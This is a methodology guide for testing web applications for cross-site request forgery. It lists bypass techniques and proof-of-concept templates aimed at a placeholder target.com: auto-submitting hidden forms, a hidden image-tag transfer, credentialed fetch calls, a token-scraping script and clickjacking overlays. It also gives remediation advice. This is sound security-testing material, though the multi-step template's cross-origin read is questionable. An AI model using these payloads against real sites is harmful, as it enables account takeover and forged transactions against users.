# Cross-Site Request Forgery (CSRF) Testing

## Overview
CSRF forces authenticated users to execute unwanted actions on a web application. The attack exploits the trust a website has in a user's browser by leveraging stored authentication credentials (cookies, HTTP auth).

## Classification
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **OWASP:** A01:2021 - Broken Access Control
- **CVSS Base:** 4.3 - 8.8

## Detection Methodology

### 1. Identify State-Changing Operations
Target actions that modify data:
- Password/email change
- Account deletion
- Money transfer
- Admin user creation
- Settings modification
- Profile updates
- API key generation/revocation
- Role/permission changes

### 2. Analyze CSRF Protections
Check for presence and enforcement of:
- **CSRF tokens** in forms and AJAX requests
- **SameSite cookie attribute** (Strict, Lax, None)
- **Origin/Referer header validation**
- **Custom header requirements** (X-Requested-With)
- **CAPTCHA** on sensitive operations
- **Re-authentication** for critical actions

### 3. Token Analysis
```
- Is token present in form/header?
- Is token validated server-side?
- Is token tied to user session?
- Is token predictable/static?
- Can token be reused across sessions?
- Does removing token bypass protection?
- Does empty token bypass protection?
- Does changing token value bypass protection?
- Is token validated for all HTTP methods (GET, POST, PUT, DELETE)?
```

### 4. SameSite Cookie Analysis
```
SameSite=Strict  → CSRF impossible via normal links
SameSite=Lax     → CSRF possible via top-level GET navigation
SameSite=None    → CSRF possible (requires Secure flag)
No SameSite set  → Browser default (Lax in modern browsers)
```

### 5. Bypass Techniques

**Token removal:**
```html
<!-- Simply remove the CSRF token parameter -->
<form action="http://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
```

**Token from another session:**
```
1. Login as attacker, capture CSRF token
2. Use attacker's token in victim's request
3. If accepted → token not session-bound
```

**Method override:**
```html
<!-- If POST has CSRF check but GET doesn't -->
<img src="http://target.com/change-email?email=attacker@evil.com">

<!-- Method override headers -->
<form action="http://target.com/api/users" method="POST">
  <input name="_method" value="PUT">
  <input name="email" value="attacker@evil.com">
</form>
```

**Referer bypass:**
```html
<!-- Suppress Referer -->
<meta name="referrer" content="no-referrer">
<form action="http://target.com/action" method="POST">...</form>

<!-- Referer matching bypass -->
<!-- If server checks: referer contains "target.com" -->
<!-- Host: attacker.com/target.com/page -->
```

**Content-Type bypass:**
```html
<!-- JSON API without CSRF -->
<form action="http://target.com/api/users" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

**Clickjacking + CSRF:**
```html
<iframe src="http://target.com/settings" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<button style="position:relative;z-index:1">Click me!</button>
```

## CSRF PoC Templates

### HTML Form (POST)
```html
<html>
<body>
  <h1>Click the button</h1>
  <form id="csrf" action="http://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Submit">
  </form>
  <!-- Auto-submit -->
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Image Tag (GET)
```html
<img src="http://target.com/transfer?to=attacker&amount=1000" style="display:none">
```

### XHR/Fetch (for APIs)
```html
<script>
fetch('http://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

### Multi-Step CSRF
```html
<script>
// Step 1: Get CSRF token from page
fetch('http://target.com/settings', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    let token = html.match(/csrf_token.*?value="(.*?)"/)[1];
    // Step 2: Use token in attack
    let form = new FormData();
    form.append('csrf_token', token);
    form.append('email', 'attacker@evil.com');
    fetch('http://target.com/change-email', {
      method: 'POST',
      credentials: 'include',
      body: form
    });
  });
</script>
```

## Tool Usage
```bash
# Burp Suite CSRF PoC generator (manual)
# Right-click request → Engagement tools → Generate CSRF PoC

# Nuclei CSRF detection
nuclei -u http://target.com -t csrf/ -batch

# Manual testing with curl
curl -X POST http://target.com/change-email \
  -H "Cookie: session=victim_session" \
  -d "email=attacker@evil.com"
# Check if it works without CSRF token
```

## Remediation
1. **Synchronizer token pattern** — unique per-session CSRF token
2. **SameSite cookie attribute** — Set to `Strict` or `Lax`
3. **Double submit cookie** — CSRF token in cookie and request body
4. **Origin/Referer validation** — check request origin
5. **Custom request headers** — require non-standard headers (AJAX only)
6. **Re-authentication** for critical operations
7. **CAPTCHA** for high-risk actions

## Evidence Collection
- Vulnerable endpoint and HTTP method
- Missing/bypassed CSRF protection
- Working PoC HTML file
- Impact assessment (what actions can be forged)
- SameSite cookie attribute values
